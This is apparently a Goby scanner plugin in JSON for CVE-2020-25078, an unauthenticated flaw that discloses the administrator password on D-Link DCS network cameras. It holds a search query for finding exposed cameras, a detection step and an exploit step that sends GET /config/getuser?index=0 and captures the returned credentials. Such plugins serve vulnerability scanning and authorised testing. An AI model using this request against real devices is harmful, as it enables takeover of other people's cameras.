{
      "Name": "D-Link DCS-2530L Administrator password disclosure CVE-2020-25078",
      "Level": "2",
      "Tags": [
            "infoleak"
      ],
      "GobyQuery": "app=\"DLink-Network-Camera\" || title=\"Document Error: Unauthorized\"",
      "Description": "D-Link is a global leader in designing and developing networking and connectivity products for consumers, small businesses, medium to large-sized enterprises, and service providers.",
      "Product": "DCS-2530L DCS-2670L DCS-4603 DCS-4622 DCS-4701E DCS-4703E DCS-4705E DCS-4802E DCS-P703",
      "Homepage": "https://www.dlink.com/",
      "Author": "",
      "Impact": "An issue was discovered on D-Link DCS-2530L before 1.06.01 Hotfix and DCS-2670L through 2.02 devices. The unauthenticated /config/getuser endpoint allows for remote administrator password disclosure.",
      "Recommendation": "",
      "References": [
            "https://nvd.nist.gov/vuln/detail/CVE-2020-25078"
      ],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/config/getuser?index=0",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "name",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "pass",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/config/getuser?index=0",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "name",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "pass",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}